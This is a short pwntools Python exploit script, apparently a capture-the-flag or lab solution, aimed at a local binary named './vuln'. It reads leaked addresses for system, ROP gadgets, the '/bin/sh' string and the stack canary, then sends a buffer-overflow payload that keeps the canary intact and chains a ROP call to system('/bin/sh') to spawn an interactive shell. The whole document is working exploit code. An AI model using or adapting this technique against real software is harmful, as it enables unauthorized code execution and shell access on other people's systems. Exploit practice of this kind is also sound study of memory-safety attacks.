from pwn import *

conn = process("./vuln")

conn.recvuntil(b"system @ 0x")
system_addr = int(conn.recvline().strip(), 16)
info("system: " + hex(system_addr))
conn.recvuntil(b"pop rdi; ret @ 0x")
pop_rdi = int(conn.recvline().strip(), 16)
info("pop rdi: " + hex(pop_rdi))
conn.recvuntil(b"ret @ 0x")
ret = int(conn.recvline().strip(), 16)
info("ret: " + hex(ret))
conn.recvuntil(b'"/bin/sh" @ 0x')
bin_sh = int(conn.recvline().strip(), 16)
info("sh: " + hex(bin_sh))
conn.recvuntil(b"canary: 0x")
canary = int(conn.recvline().strip(), 16)
info("canary: " + hex(canary))

conn.sendline(b"a"*56 + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr))

conn.interactive()
